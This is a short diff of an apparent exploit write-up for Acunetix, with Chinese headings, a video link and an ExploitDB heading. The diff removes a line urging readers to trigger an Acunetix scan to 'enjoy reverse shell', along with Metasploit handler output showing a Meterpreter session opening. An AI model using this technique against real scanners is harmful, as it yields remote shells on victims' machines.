@@ -52,14 +52,6 @@ Exploit target:
    --  ----
    0   Wildcard Target
 ```
-- Start a new scan with Acunetix using your local ip and enjoy reverse shell!
-`
-msf exploit(handler) > run
-[*] Started reverse TCP handler on 0.0.0.0:4444
-[*] Starting the payload handler...
-[*] Sending stage (957487 bytes) to 172.16.24.192
-[*] Meterpreter session 1 opened (172.16.24.1:4444 -> 172.16.24.192:51782) at 2016-05-02 15:02:31 +0200
-`
 
 `视频地址:https://www.youtube.com/watch?v=gWcRlam59Fs`
 ## ExploitDB地址
